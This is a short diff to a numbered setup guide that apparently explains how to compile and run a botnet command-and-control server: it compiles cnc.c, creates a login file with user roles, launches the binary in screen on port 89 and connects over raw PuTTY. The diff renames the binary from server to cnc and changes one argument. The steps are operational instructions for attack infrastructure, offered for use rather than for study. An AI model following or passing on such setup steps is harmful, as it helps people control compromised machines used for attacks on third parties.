@@ -20,8 +20,8 @@
 4. Save your payload
 5. gcc cnc.c -o cnc -pthread
 6. nano login.txt (username password role mm/dd/yy)
-7. screen ./server 89 5 (port)
-8. sudo screen ./server 89 1000 (port) (If step 7 doesn't work)
+7. screen ./cnc 89 5 (port)
+8. sudo screen ./cnc 89 5 (port) (If step 7 doesn't work)
 9. Connect you your server via Raw in putty</pre></code>
    <div>
 
